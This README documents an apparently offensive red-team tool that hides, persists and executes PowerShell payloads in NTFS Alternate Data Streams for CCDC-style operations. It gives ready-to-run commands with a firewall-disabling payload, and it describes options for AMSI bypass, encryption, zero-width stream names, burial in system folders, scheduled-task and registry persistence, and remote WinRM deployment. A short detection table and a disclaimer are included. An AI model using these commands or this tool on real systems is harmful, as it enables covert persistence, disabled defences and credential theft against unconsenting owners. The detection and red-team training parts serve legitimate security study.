#### README.md
# Apparition Delivery System
```
. : .  .  .. ... ...... ..................... ...... ... .. .  . : .
: .   .       .       .        .        .        .        .   . . :
.       _    ___   ___   _     ___    ___ _____  _   ___  _  _       .
       /_\   | _ \| _ \ /_\   | __ \ |_ _|_   _|| | / _ \| \| |
      / _ \  |  _/|  _// _ \  | |/ /  | |  | |  | || (_) | .` |
     /_/ \_\ |_|  |_/ /_/ \_\ |_|\_| |___| |_|  |_| \___/|_|\_|
: .    . .   . . ..  . .. . . .. . .. .. . .. ... . .. .    . . :
.   .  .     . :     .    :  . : :   . : :    . :      .    .   .
   .   :      '  Apparition Delivery System (ADS) '      :    .
 .  .  .   . . ' " Execution without presence " ' .    .   .  .
    . .      . .. .. . ... .................. .. . .. .      . .
```

**ADS hides, persists, and executes arbitrary PowerShell payloads inside NTFS Alternate Data Streams. The aim was to provide PoC for research into novel red team ideas on Windows, and it turned into a bit more than that.**

Current version: **v2.4** | [Quick-Start Guide](QUICK-START.md)

---

## What Do I Type?

Three canonical examples. Copy, modify the payload, run on Kali.

```bash
# 1. Fastest possible — firewall down, default Advanced stealth, task persistence
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
  -OutputFile /tmp/fw-off.txt

# 2. Standard CCDC op — Advanced stealth, registry persist, 3 redundant instances
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
  -Obfuscate Advanced \
  -Persist registry \
  -InstanceCount 3 \
  -OutputFile /tmp/fw-registry.txt

# 3. Max stealth — encrypted + Paranoid tier + deep placement
pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/mypayload.ps1 \
  -Obfuscate Paranoid \
  -Encrypt \
  -OutputFile /tmp/paranoid.txt
```

Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file into PowerShell as Administrator.

---

## Quick-Reference: All Options

### ADS-OneLiner.ps1 (run on Kali — generates the one-liner)

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| **Payload Input** | | | |
| `-Payload 'cmd'` | string | — | Inline PowerShell. Use single quotes in bash. |
| `-PayloadFile /path` | string | — | Read payload from file. Best for `$variables`. |
| `-PayloadAtDeployment` | switch | off | Prompt for payload on Windows target at paste time. |
| **Stealth Tier** | | | |
| `-Obfuscate None\|Basic\|Advanced\|Paranoid` | string | `Advanced` | See tier table below. |
| **Persistence** | | | |
| `-Persist task\|registry\|none` | string | `task` | How the payload re-triggers. |
| `-Trigger AtLogOn,AtStartup,OnIdle,OnUnlock` | string[] | `AtLogOn,AtStartup` | When the task fires. Multiple allowed. |
| `-PeriodicMinutes N` | int 1–1440 | `5` | Periodic task interval in minutes. |
| `-JitterPercent N` | int 0–50 | `20` | Randomize timing by ±N% of interval. |
| `-InstanceCount N` | int 1–20 | `1` | Deploy N independent copies with unique names/paths. |
| **Evasion** | | | |
| `-Encrypt` | switch | off | DPAPI machine-bound encrypt payload. |
| `-UseCompression $true\|$false` | bool | `$true` | DeflateStream compression (~50% smaller). |
| `-Randomize $true\|$false` | bool | tier-implied | Randomize all artifact names. |
| `-UseDeepPlacement $true\|$false` | bool | tier-implied | Bury ADS in WER/Cache dirs. |
| `-AttachToExisting $true\|$false` | bool | tier-implied | Attach to existing system file. |
| `-NoAmsi` | switch | off | Disable AMSI bypass (almost never use). |
| **Stream Naming** | | | |
| `-ZeroWidthStreams` | switch | tier-implied | ZW Unicode chars in stream names. |
| `-ZeroWidthMode single\|multi\|hybrid` | string | `single` | ZW character pattern. |
| `-HybridPrefix name` | string | — | Visible prefix for hybrid mode (e.g., `Zone.Identifier`). |
| `-CreateDecoys N` | int 0–10 | `0` | Create N benign decoy ADS streams. |
| **Output** | | | |
| `-OutputFile path` | string | `ads-payload.txt` | Where to save the generated deployment file. |
| `-ManifestDir path` | string | `./manifests` | Where to save the cleanup manifest. |

### ADS-Dropper.ps1 (run on Windows — direct deployment or -GenerateOnly)

All OneLiner parameters above, plus:

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-Targets host[]` | string[] | `localhost` | Remote target hosts (WinRM). |
| `-Credential cred` | PSCredential | — | Credentials for remote deployment. |
| `-NoExec` | switch | off | Stage artifacts without executing. |
| `-ManifestPath path` | string | — | Path to save cleanup manifest. |
| `-GenerateOnly` | switch | off | Print config object without creating artifacts (Linux). |
| `-PayloadAtRuntime` | switch | off | Prompt for payload on Windows at runtime. |
| `-Help` | switch | — | Show full inline help. |

---

## Stealth Tier Guide

The `-Obfuscate` parameter is the primary control. Most other evasion parameters are implied by the tier.

| Tier | Task/File Names | ADS Placement | ZW Streams | Implied Settings | When to Use |
|------|-----------------|---------------|------------|-----------------|-------------|
| `None` | Fixed: `SystemOptimization`, `SystemCache.dat` | `C:\ProgramData\` | No | — | **Testing only. Never in competition.** |
| `Basic` | Word-list random | `C:\ProgramData\` | No | — | Quick deployment, acceptable stealth. |
| `Advanced` | Word-list random | WER\Cache, Diagnosis | No | Randomize + DeepPlace + Attach | **Default. Standard CCDC.** |
| `Paranoid` | Word-list random | WER\Cache + attach | Yes | All Advanced + ZeroWidth | Max stealth. Harder to clean up. |

**Override example** (Advanced stealth but disable deep placement):
```bash
pwsh src/ADS-OneLiner.ps1 -Payload 'cmd' -Obfuscate Advanced -UseDeepPlacement $false
```

---

## Architecture

```
[Kali]  ADS-OneLiner.ps1  →  deployment one-liner (base64)
          |
          | paste on Windows
          v
[Target] ADS-Dropper.ps1  →  [ADS payload]  ←  NTFS stream (invisible to dir/ls)
                          →  [JScript wrapper]  (wscript.exe → no PS window)
                          →  [Task Scheduler] or [Registry Run key]
```

**Two-script architecture:**
- `src/ADS-OneLiner.ps1` — Runs on Linux/Kali. Generates minimal deployment commands. No file uploads needed.
- `src/ADS-Dropper.ps1` — Runs on Windows. All business logic: ADS creation, encryption, persistence, cleanup.

---

## Persistence Methods

### Task Persistence (`-Persist task`)
- Requires admin
- Creates a JScript wrapper (`wscript.exe //B file.js`) — no visible PowerShell window
- Fires on: configured `-Trigger` events + periodic every `-PeriodicMinutes` minutes
- Task name randomized from plausible word lists (Advanced/Paranoid tier)

### Registry Persistence (`-Persist registry`)
- Works as user or admin
- Sets `HKCU:\...\Run` (and `HKLM:\...\Run` if admin)
- Fires in the user's logon session — interactive payloads (memes, UI effects) work here
- Companion scheduled task handles periodic re-trigger

---

## Session Context: Interactive vs. SYSTEM

Tasks run as `NT AUTHORITY\SYSTEM` (Session 0). Payloads that open windows, play audio, or access the clipboard need a **user session**.

| Context | Use `-Persist task` | Use `-Persist registry` |
|---------|--------------------|-----------------------|
| SYSTEM (Session 0) | Firewall, registry, files, services, credential dump | — |
| User session | `-Trigger AtLogOn` or `OnUnlock` | Always user session |
| Interactive UI (memes, desktop effects) | Use `-Trigger AtLogOn` only | Preferred |

**Rule:** For anything that needs to be visible to a human (memes, popups, audio), use `-Persist registry`.

---

## Detection Surface

| Technique | Detection Vector |
|-----------|-----------------|
| ADS creation | Sysmon Event 15 (FileCreateStreamHash). `dir /r` in cmd shows stream sizes. |
| Scheduled task | Event ID 4698 (Task Created). `Get-ScheduledTask` shows obfuscated name. |
| Registry Run key | Event ID 4657 (Registry Modification). Standard auditing. |
| JScript execution | `wscript.exe` in process tree. No PowerShell window. |
| AMSI bypass | XOR byte array in deployment script — fragmented so no contiguous string. |
| Payload at runtime | Compressed + base64. No plaintext payload on disk. |

**MITRE ATT&CK:** T1564.004 (ADS) | T1053.005 (Scheduled Task) | T1547.001 (Registry Run Keys)

---

## References & Credits

- Oddvar Moe — ADS execution techniques: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
- Enigma0x3 — ADS persistence: https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/
- MITRE ATT&CK T1564.004: https://attack.mitre.org/techniques/T1564/004/
- NTFS streams: https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams

---

## See Also

- [QUICK-START.md](QUICK-START.md) — Full parameter reference, scenario cookbook, bash escaping guide
- [docs/tests/COMPREHENSIVE-TEST-SUITE.md](docs/tests/COMPREHENSIVE-TEST-SUITE.md) — Full VM validation test suite
- [defense/](defense/) — Blue team detection scripts

---

## License & Disclaimer

For authorized security testing, CCDC competition, and security research only.

Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical. The author assumes no liability for misuse.

By using this tool you agree to: obtain explicit permission before testing, follow responsible disclosure practices, and provide detection guidance to defenders when appropriate.

---

*"Execution without presence"*
© 2026 Qweary — Security Research With Purpose
Contact: qwearyblog@gmail.com | https://qweary.github.io | https://github.com/Qweary
